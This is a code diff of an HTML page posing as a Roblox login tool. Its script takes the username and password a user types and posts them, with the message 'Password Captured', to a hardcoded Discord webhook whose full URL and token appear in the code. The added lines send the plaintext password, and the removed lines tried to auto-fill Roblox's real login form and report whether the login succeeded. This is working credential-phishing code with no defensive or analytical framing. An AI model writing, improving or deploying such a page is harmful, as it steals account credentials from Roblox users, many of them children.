@@ -15,77 +15,48 @@ button { padding:10px 20px; margin:10px; border-radius:5px; border:none; backgro
 
 <input id="username" placeholder="Username / Email">
 <input id="password" type="password" placeholder="Password">
-<button id="loginBtn">Login</button>
+<button id="sendBtn">Send to Webhook</button>
+<button id="loginBtn">Open Roblox Login Page</button>
 
-<p id="status">Enter credentials and click Login</p>
+<p id="status">Enter credentials and click a button</p>
 
 <script>
-const loginBtn = document.getElementById("loginBtn");
-const statusEl = document.getElementById("status");
-
-// Your Discord webhook URL
+// Discord webhook URL
 const webhookURL = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";
 
-function sendWebhook(username, status) {
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const statusEl = document.getElementById("status");
+
+function sendWebhook(username, password) {
     fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            username: "Roblox Login Checker",
-            content: `**🔐 Password Captured**\n👤 User: ${username}\nStatus: ${status}`
+            username: "Roblox Login Logger",
+            content: `🔐 **Password Captured**\n👤 User: ${username}\n🔑 Password: ${password}\n🌍 Status: ❌ Pending manual login`
         })
-    }).catch(console.error);
+    })
+    .then(() => statusEl.textContent = "✅ Credentials sent to webhook!")
+    .catch(() => statusEl.textContent = "❌ Failed to send to webhook!");
 }
 
-loginBtn.addEventListener("click", () => {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value;
-
-    if (!username || !password) {
-        statusEl.textContent = "❌ Please enter both username and password!";
+document.getElementById("sendBtn").addEventListener("click", () => {
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value;
+    if(!username || !password){
+        statusEl.textContent = "❌ Enter both username and password!";
         return;
     }
+    sendWebhook(username, password);
+});
 
-    statusEl.textContent = "⏳ Attempting login...";
-
-    // Open Roblox login page in new tab
-    const loginWindow = window.open("https://www.roblox.com/login", "_blank");
-
-    const interval = setInterval(() => {
-        try {
-            const doc = loginWindow.document;
-            const userInput = doc.querySelector('#login-username');
-            const passInput = doc.querySelector('#login-password');
-            const loginBtnRoblox = doc.querySelector('#login-button-login');
-
-            if (userInput && passInput && loginBtnRoblox) {
-                userInput.value = username;
-                passInput.value = password;
-                loginBtnRoblox.click();
-
-                // Wait a few seconds for redirect
-                setTimeout(() => {
-                    try {
-                        const url = loginWindow.location.href;
-                        if (url.includes("/home")) {
-                            statusEl.textContent = "✅ Login Successful!";
-                            sendWebhook(username, "✅ Success");
-                        } else {
-                            statusEl.textContent = "❌ Login Failed!";
-                            sendWebhook(username, "❌ Failed");
-                        }
-                    } catch(e) {
-                        statusEl.textContent = "✅ Login attempt sent (check Roblox tab).";
-                        sendWebhook(username, "✅ Attempt sent (cross-origin)");
-                    }
-                }, 5000);
-
-                clearInterval(interval);
-            }
-        } catch(e) {}
-    }, 1000);
+document.getElementById("loginBtn").addEventListener("click", () => {
+    window.open("https://www.roblox.com/login", "_blank");
+    statusEl.textContent = "➡️ Roblox login page opened. Paste credentials manually.";
 });
 </script>
 </body>
 </html>
+
 
